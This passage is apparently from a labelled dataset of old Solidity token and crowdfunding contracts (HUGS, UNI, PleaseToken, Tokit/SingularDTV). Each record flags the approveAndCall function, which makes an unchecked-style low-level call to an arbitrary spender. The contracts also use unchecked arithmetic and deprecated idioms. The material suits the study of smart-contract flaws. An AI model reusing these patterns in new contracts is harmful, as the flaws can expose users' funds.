  "filename": "32244.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HUGSTOKEN is StandardToken {\n function () {\n throw;\n }\n string public name = \"Hugs Tokens\";\n uint8 public decimals = 0;\n string public symbol = \"HUG\";\n string public version = 'H1.0';\n function HUGSTOKEN(\n ) {\n balances[msg.sender] = 500000;\n totalSupply = 500000;\n name = \"HUGS TOKEN\";\n decimals = 0;\n symbol = \"HUG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a8"
  },
  "filename": "32274.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token (\n ) {\n balances[msg.sender] = 10000000000000000000000000;\n totalSupply = 10000000000000000000000000;\n name = \"Universal Library\";\n decimals = 18;\n symbol = \"UNI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a9"
  },
  "filename": "32304.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AbstractPaymentEscrow is Ownable {\n address public wallet;\n mapping (uint => uint) public deposits;\n event Payment(address indexed _customer, uint indexed _projectId, uint value);\n event Withdraw(address indexed _wallet, uint value);\n function withdrawFunds() public;\n function changeWallet(address _wallet)\n public\n onlyOwner()\n {\n wallet = _wallet;\n }\n function getDeposit(uint _projectId)\n public\n constant\n returns (uint)\n {\n return deposits[_projectId];\n }\n}\ncontract TokitRegistry is Ownable {\n struct ProjectContracts {\n address token;\n address fund;\n address campaign;\n }\n mapping (address => bool) public registrars;\n mapping (address => mapping(uint => ProjectContracts)) public registry;\n mapping (uint => ProjectContracts) public project_registry;\n event RegisteredToken(address indexed _projectOwner, uint indexed _projectId, address _token, address _fund);\n event RegisteredCampaign(address indexed _projectOwner, uint indexed _projectId, address _campaign);\n modifier onlyRegistrars() {\n require(registrars[msg.sender]);\n _;\n }\n function TokitRegistry(address _owner) {\n setRegistrar(_owner, true);\n transferOwnership(_owner);\n }\n function register(address _customer, uint _projectId, address _token, address _fund)\n onlyRegistrars()\n {\n registry[_customer][_projectId].token = _token;\n registry[_customer][_projectId].fund = _fund;\n project_registry[_projectId].token = _token;\n project_registry[_projectId].fund = _fund;\n RegisteredToken(_customer, _projectId, _token, _fund);\n }\n function register(address _customer, uint _projectId, address _campaign)\n onlyRegistrars()\n {\n registry[_customer][_projectId].campaign = _campaign;\n project_registry[_projectId].campaign = _campaign;\n RegisteredCampaign(_customer, _projectId, _campaign);\n }\n function lookup(address _customer, uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n registry[_customer][_projectId].token,\n registry[_customer][_projectId].fund,\n registry[_customer][_projectId].campaign\n );\n }\n function lookupByProject(uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n project_registry[_projectId].token,\n project_registry[_projectId].fund,\n project_registry[_projectId].campaign\n );\n }\n function setRegistrar(address _registrar, bool enabled)\n onlyOwner()\n {\n registrars[_registrar] = enabled;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract AbstractSingularDTVToken is Token {\n}\ncontract SingularDTVFund {\n string public version = \"0.1.0\";\n AbstractSingularDTVToken public singularDTVToken;\n address public owner;\n uint public totalReward;\n mapping (address => uint) public rewardAtTimeOfWithdraw;\n mapping (address => uint) public owed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n function depositReward()\n public\n payable\n returns (bool)\n {\n totalReward += msg.value;\n return true;\n }\n function calcReward(address forAddress) private returns (uint) {\n return singularDTVToken.balanceOf(forAddress) * (totalReward - rewardAtTimeOfWithdraw[forAddress]) / singularDTVToken.totalSupply();\n }\n function withdrawReward()\n public\n returns (uint)\n {\n uint value = calcReward(msg.sender) + owed[msg.sender];\n rewardAtTimeOfWithdraw[msg.sender] = totalReward;\n owed[msg.sender] = 0;\n if (value > 0 && !msg.sender.send(value)) {\n revert();\n }\n return value;\n }\n function softWithdrawRewardFor(address forAddress)\n external\n returns (uint)\n {\n uint value = calcReward(forAddress);\n rewardAtTimeOfWithdraw[forAddress] = totalReward;\n owed[forAddress] += value;\n return value;\n }\n function setup(address singularDTVTokenAddress)\n external\n onlyOwner\n returns (bool)\n {\n if (address(singularDTVToken) == 0) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n return true;\n }\n return false;\n }\n function SingularDTVFund() {\n owner = msg.sender;\n }\n function ()\n public\n payable\n {\n if (msg.value == 0) {\n withdrawReward();\n } else {\n depositReward();\n }\n }\n}\ncontract SingularDTVLaunch {\n string public version = \"0.1.0\";\n event Contributed(address indexed contributor, uint contribution, uint tokens);\n AbstractSingularDTVToken public singularDTVToken;\n address public workshop;\n address public SingularDTVWorkshop = 0xc78310231aA53bD3D0FEA2F8c705C67730929D8f;\n uint public SingularDTVWorkshopFee;\n uint public CAP;\n uint public DURATION;\n uint public TOKEN_TARGET;\n enum Stages {\n Deployed,\n GoingAndGoalNotReached,\n EndedAndGoalNotReached,\n GoingAndGoalReached,\n EndedAndGoalReached\n }\n address public owner;\n uint public startDate;\n uint public fundBalance;\n uint public valuePerToken;\n uint public tokensSent;\n mapping (address => uint) public contributions;\n mapping (address => uint) public sentTokens;\n Stages public stage = Stages.Deployed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier atStage(Stages _stage) {\n if (stage != _stage) {\n revert();\n }\n _;\n }\n modifier atStageOR(Stages _stage1, Stages _stage2) {\n if (stage != _stage1 && stage != _stage2) {\n revert();\n }\n _;\n }\n modifier timedTransitions() {\n uint timeElapsed = now - startDate;\n if (timeElapsed >= DURATION) {\n if (stage == Stages.GoingAndGoalNotReached) {\n stage = Stages.EndedAndGoalNotReached;\n } else if (stage == Stages.GoingAndGoalReached) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n _;\n }\n function checkInvariants() constant internal {\n if (fundBalance > this.balance) {\n revert();\n }\n }\n function emergencyCall()\n public\n returns (bool)\n {\n if (fundBalance > this.balance) {\n if (this.balance > 0 && !SingularDTVWorkshop.send(this.balance)) {\n revert();\n }\n return true;\n }\n return false;\n }\n function fund()\n public\n timedTransitions\n atStageOR(Stages.GoingAndGoalNotReached, Stages.GoingAndGoalReached)\n payable\n returns (uint)\n {\n uint tokenCount = (msg.value * (10**18)) / valuePerToken;\n require(tokenCount > 0);\n if (tokensSent + tokenCount > CAP) {\n tokenCount = CAP - tokensSent;\n }\n tokensSent += tokenCount;\n uint contribution = (tokenCount * valuePerToken) / (10**18);\n if (msg.value > contribution && !msg.sender.send(msg.value - contribution)) {\n revert();\n }\n fundBalance += contribution;\n contributions[msg.sender] += contribution;\n sentTokens[msg.sender] += tokenCount;\n if (!singularDTVToken.transfer(msg.sender, tokenCount)) {\n revert();\n }\n if (stage == Stages.GoingAndGoalNotReached) {\n if (tokensSent >= TOKEN_TARGET) {\n stage = Stages.GoingAndGoalReached;\n }\n }\n if (stage == Stages.GoingAndGoalReached) {\n if (tokensSent == CAP) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n checkInvariants();\n Contributed(msg.sender, contribution, tokenCount);\n return tokenCount;\n }\n function withdrawContribution()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint tokensReceived = sentTokens[msg.sender];\n sentTokens[msg.sender] = 0;\n if (!singularDTVToken.transferFrom(msg.sender, owner, tokensReceived)) {\n revert();\n }\n uint contribution = contributions[msg.sender];\n contributions[msg.sender] = 0;\n fundBalance -= contribution;\n if (contribution > 0) {\n msg.sender.transfer(contribution);\n }\n checkInvariants();\n return contribution;\n }\n function withdrawForWorkshop()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalReached)\n returns (bool)\n {\n uint value = fundBalance;\n fundBalance = 0;\n require(value > 0);\n uint networkFee = value * SingularDTVWorkshopFee / 100;\n workshop.transfer(value - networkFee);\n SingularDTVWorkshop.transfer(networkFee);\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return true;\n }\n function withdrawUnsentTokensForOwner()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return remainingTokens;\n }\n function changeValuePerToken(uint valueInWei)\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (bool)\n {\n valuePerToken = valueInWei;\n return true;\n }\n function updateStage()\n public\n timedTransitions\n returns (Stages)\n {\n return stage;\n }\n function start()\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (uint)\n {\n if (!singularDTVToken.transferFrom(msg.sender, this, CAP)) {\n revert();\n }\n startDate = now;\n stage = Stages.GoingAndGoalNotReached;\n checkInvariants();\n return startDate;\n }\n function SingularDTVLaunch(\n address singularDTVTokenAddress,\n address _workshop,\n address _owner,\n uint _total,\n uint _unit_price,\n uint _duration,\n uint _threshold,\n uint _singulardtvwoskhop_fee\n ) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n workshop = _workshop;\n owner = _owner;\n CAP = _total;\n valuePerToken = _unit_price;\n DURATION = _duration;\n TOKEN_TARGET = _threshold;\n SingularDTVWorkshopFee = _singulardtvwoskhop_fee;\n }\n function ()\n public\n payable\n {\n if (stage == Stages.GoingAndGoalNotReached || stage == Stages.GoingAndGoalReached)\n fund();\n else if (stage == Stages.EndedAndGoalNotReached)\n withdrawContribution();\n else\n revert();\n }\n}\ncontract AbstractSingularDTVFund {\n function softWithdrawRewardFor(address forAddress) returns (uint);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract SingularDTVToken is StandardToken {\n string public version = \"0.1.0\";\n AbstractSingularDTVFund public singularDTVFund;\n string public name;\n string public symbol;\n uint8 public constant decimals = 18;\n function transfer(address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(msg.sender);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transfer(to, value);\n }\n function transferFrom(address from, address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(from);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transferFrom(from, to, value);\n }\n function SingularDTVToken(address sDTVFundAddr, address _wallet, string _name, string _symbol, uint _totalSupply) {\n if(sDTVFundAddr == 0 || _wallet == 0) {\n revert();\n }\n balances[_wallet] = _totalSupply;\n totalSupply = _totalSupply;\n name = _name;\n symbol = _symbol;\n singularDTVFund = AbstractSingularDTVFund(sDTVFundAddr);\n Transfer(this, _wallet, _totalSupply);\n }\n}\ncontract TokitDeployer is Ownable {\n TokitRegistry public registry;\n mapping (uint8 => AbstractPaymentEscrow) public paymentContracts;\n event DeployedToken(address indexed _customer, uint indexed _projectId, address _token, address _fund);\n event DeployedCampaign(address indexed _customer, uint indexed _projectId, address _campaign);\n function TokitDeployer(address _owner, address _registry) {\n transferOwnership(_owner);\n registry = TokitRegistry(_registry);\n }\n function deployToken(\n address _customer, uint _projectId, uint8 _payedWith, uint _amountNeeded,\n address _wallet, string _name, string _symbol, uint _totalSupply\n )\n onlyOwner()\n {\n require(AbstractPaymentEscrow(paymentContracts[_payedWith]).getDeposit(_projectId) >= _amountNeeded);\n var (t,,) = registry.lookup(_customer, _projectId);\n require(t == address(0));\n SingularDTVFund fund = new SingularDTVFund();\n SingularDTVToken token = new SingularDTVToken(fund, _wallet, _name, _symbol, _totalSupply);\n fund.setup(token);\n registry.register(_customer, _projectId, token, fund);\n DeployedToken(_customer, _projectId, token, fund);\n }\n function deployCampaign(\n address _customer, uint _projectId,\n address _workshop, uint _total, uint _unitPrice, uint _duration, uint _threshold, uint _networkFee\n )\n onlyOwner()\n {\n var (t,f,c) = registry.lookup(_customer, _projectId);\n require(c == address(0));\n require(t != address(0) && f != address(0));\n SingularDTVLaunch campaign = new SingularDTVLaunch(t, _workshop, _customer, _total, _unitPrice, _duration, _threshold, _networkFee);\n registry.register(_customer, _projectId, campaign);\n DeployedCampaign(_customer, _projectId, campaign);\n }\n function setRegistryContract(address _registry)\n onlyOwner()\n {\n registry = TokitRegistry(_registry);\n }\n function setPaymentContract(uint8 _paymentType, address _paymentContract)\n onlyOwner()\n {\n paymentContracts[_paymentType] = AbstractPaymentEscrow(_paymentContract);\n }\n function deletePaymentContract(uint8 _paymentType)\n onlyOwner()\n {\n delete paymentContracts[_paymentType];\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14aa"
  },
  "filename": "32305.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PleaseToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function PleaseToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14ab"
  },
  "filename": "32315.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract AbstractPaymentEscrow is Ownable {\n address public wallet;\n mapping (uint => uint) public deposits;\n event Payment(address indexed _customer, uint indexed _projectId, uint value);\n event Withdraw(address indexed _wallet, uint value);\n function withdrawFunds() public;\n function changeWallet(address _wallet)\n public\n onlyOwner()\n {\n wallet = _wallet;\n }\n function getDeposit(uint _projectId)\n public\n constant\n returns (uint)\n {\n return deposits[_projectId];\n }\n}\ncontract TokitRegistry is Ownable {\n struct ProjectContracts {\n address token;\n address fund;\n address campaign;\n }\n mapping (address => bool) public registrars;\n mapping (address => mapping(uint => ProjectContracts)) public registry;\n mapping (uint => ProjectContracts) public project_registry;\n event RegisteredToken(address indexed _projectOwner, uint indexed _projectId, address _token, address _fund);\n event RegisteredCampaign(address indexed _projectOwner, uint indexed _projectId, address _campaign);\n modifier onlyRegistrars() {\n require(registrars[msg.sender]);\n _;\n }\n function TokitRegistry(address _owner) {\n setRegistrar(_owner, true);\n transferOwnership(_owner);\n }\n function register(address _customer, uint _projectId, address _token, address _fund)\n onlyRegistrars()\n {\n registry[_customer][_projectId].token = _token;\n registry[_customer][_projectId].fund = _fund;\n project_registry[_projectId].token = _token;\n project_registry[_projectId].fund = _fund;\n RegisteredToken(_customer, _projectId, _token, _fund);\n }\n function register(address _customer, uint _projectId, address _campaign)\n onlyRegistrars()\n {\n registry[_customer][_projectId].campaign = _campaign;\n project_registry[_projectId].campaign = _campaign;\n RegisteredCampaign(_customer, _projectId, _campaign);\n }\n function lookup(address _customer, uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n registry[_customer][_projectId].token,\n registry[_customer][_projectId].fund,\n registry[_customer][_projectId].campaign\n );\n }\n function lookupByProject(uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n project_registry[_projectId].token,\n project_registry[_projectId].fund,\n project_registry[_projectId].campaign\n );\n }\n function setRegistrar(address _registrar, bool enabled)\n onlyOwner()\n {\n registrars[_registrar] = enabled;\n }\n}\ncontract SingularDTVFund {\n string public version = \"0.1.0\";\n AbstractSingularDTVToken public singularDTVToken;\n address public owner;\n uint public totalReward;\n mapping (address => uint) public rewardAtTimeOfWithdraw;\n mapping (address => uint) public owed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n function depositReward()\n public\n payable\n returns (bool)\n {\n totalReward += msg.value;\n return true;\n }\n function calcReward(address forAddress) private returns (uint) {\n return singularDTVToken.balanceOf(forAddress) * (totalReward - rewardAtTimeOfWithdraw[forAddress]) / singularDTVToken.totalSupply();\n }\n function withdrawReward()\n public\n returns (uint)\n {\n uint value = calcReward(msg.sender) + owed[msg.sender];\n rewardAtTimeOfWithdraw[msg.sender] = totalReward;\n owed[msg.sender] = 0;\n if (value > 0 && !msg.sender.send(value)) {\n revert();\n }\n return value;\n }\n function softWithdrawRewardFor(address forAddress)\n external\n returns (uint)\n {\n uint value = calcReward(forAddress);\n rewardAtTimeOfWithdraw[forAddress] = totalReward;\n owed[forAddress] += value;\n return value;\n }\n function setup(address singularDTVTokenAddress)\n external\n onlyOwner\n returns (bool)\n {\n if (address(singularDTVToken) == 0) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n return true;\n }\n return false;\n }\n function SingularDTVFund() {\n owner = msg.sender;\n }\n function ()\n public\n payable\n {\n if (msg.value == 0) {\n withdrawReward();\n } else {\n depositReward();\n }\n }\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract AbstractSingularDTVFund {\n function softWithdrawRewardFor(address forAddress) returns (uint);\n}\ncontract SingularDTVToken is StandardToken {\n string public version = \"0.1.0\";\n AbstractSingularDTVFund public singularDTVFund;\n string public name;\n string public symbol;\n uint8 public constant decimals = 18;\n function transfer(address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(msg.sender);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transfer(to, value);\n }\n function transferFrom(address from, address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(from);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transferFrom(from, to, value);\n }\n function SingularDTVToken(address sDTVFundAddr, address _wallet, string _name, string _symbol, uint _totalSupply) {\n if(sDTVFundAddr == 0 || _wallet == 0) {\n revert();\n }\n balances[_wallet] = _totalSupply;\n totalSupply = _totalSupply;\n name = _name;\n symbol = _symbol;\n singularDTVFund = AbstractSingularDTVFund(sDTVFundAddr);\n Transfer(this, _wallet, _totalSupply);\n }\n}\ncontract AbstractSingularDTVToken is Token {\n}\ncontract SingularDTVLaunch {\n string public version = \"0.1.0\";\n event Contributed(address indexed contributor, uint contribution, uint tokens);\n AbstractSingularDTVToken public singularDTVToken;\n address public workshop;\n address public SingularDTVWorkshop = 0xc78310231aA53bD3D0FEA2F8c705C67730929D8f;\n uint public SingularDTVWorkshopFee;\n uint public CAP;\n uint public DURATION;\n uint public TOKEN_TARGET;\n enum Stages {\n Deployed,\n GoingAndGoalNotReached,\n 